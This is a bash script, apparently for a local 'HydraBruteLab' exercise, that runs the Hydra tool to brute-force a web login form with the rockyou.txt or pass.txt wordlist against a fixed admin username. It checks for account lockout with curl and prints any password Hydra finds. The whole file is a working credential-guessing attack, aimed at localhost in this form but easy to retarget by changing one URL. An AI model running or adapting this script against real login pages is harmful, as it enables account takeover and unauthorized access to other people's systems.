#!/bin/bash

# --- MENU SELECTION ---
echo "------------------------------------------------"
echo "Select the target environment:"
echo "[1] Simple Website"
echo "[2] Advanced Website"
echo "------------------------------------------------"
read -p "Enter your choice [1 or 2]: " choice

if [[ "$choice" == "1" ]]; then
    echo "[*] Configuring for SIMPLE website..."
    # Localhost URL for the curl check
    URL="http://localhost/HydraBruteLab/simple/login.php"
    WORDLIST="rockyou.txt"
    # Path specifically for the Hydra command syntax
    URL_PATH="/HydraBruteLab/simple/login.php"
    
elif [[ "$choice" == "2" ]]; then
    echo "[*] Configuring for ADVANCED website..."
    # Localhost URL for the curl check
    URL="http://localhost/HydraBruteLab/advanced/login.php"
    WORDLIST="pass.txt"
    # Path specifically for the Hydra command syntax
    URL_PATH="/HydraBruteLab/advanced/login.php"
    
else
    echo "[!] Invalid selection. Exiting."
    exit 1
fi

# --- CONFIGURATION ---
USER="admin@admin.admin"
# The message that indicates the account is locked
LOCK_MSG="Account temporary locked"
# The standard failure message (used to define the Hydra command)
FAIL_MSG="Wrong password"

# Check if wordlist exists
if [ ! -f "$WORDLIST" ]; then
    echo "[!] Error: Wordlist '$WORDLIST' not found!"
    exit 1
fi

echo "------------------------------------------------"
echo "[*] Starting Attack on: localhost$URL_PATH"
echo "------------------------------------------------"

# --- RUN HYDRA (No Chunking) ---
# We run Hydra once. We capture the output to variable $OUTPUT so we can analyze it.
# Note: If the account locks during this run, Hydra might report a "False Positive" 
# (saying it found a password) because the "Wrong password" message disappeared.
# That is why the Lock Check below is crucial.

OUTPUT=$(hydra -l $USER -P $WORDLIST -t 1 -o /dev/null localhost http-form-post "$URL_PATH:email=^USER^&password=^PASS^&submit=Submit:F=$FAIL_MSG" 2>&1)

# --- CHECK FOR LOCKOUT ---
# As requested: Check strictly if account is locked. If so, STOP.
# We probe the server manually with curl to see the current status.

TEST_RESP=$(curl -s -d "email=$USER&password=CheckLockStatus&submit=Submit" $URL)

if [[ "$TEST_RESP" == *"$LOCK_MSG"* ]]; then
    echo ""
    echo "#############################################"
    echo "[!] ALERT: ACCOUNT LOCKED OUT!"
    echo "#############################################"
    echo "[*] The server is returning: '$LOCK_MSG'"
    echo "[*] Stopping script immediately as requested."
    exit 1
fi

# --- CHECK FOR SUCCESS ---
# If we are NOT locked out, we check if Hydra actually found the password.

if echo "$OUTPUT" | grep -q "host: localhost"; then
     echo ""
     echo "#############################################"
     echo "[+] SUCCESS FOUND!"
     # Extract the line containing the password from Hydra output
     echo "$OUTPUT" | grep "login:" 
     echo "#############################################"
     exit 0
else
     echo "[-] Attack finished. No password found (and not locked)."
fi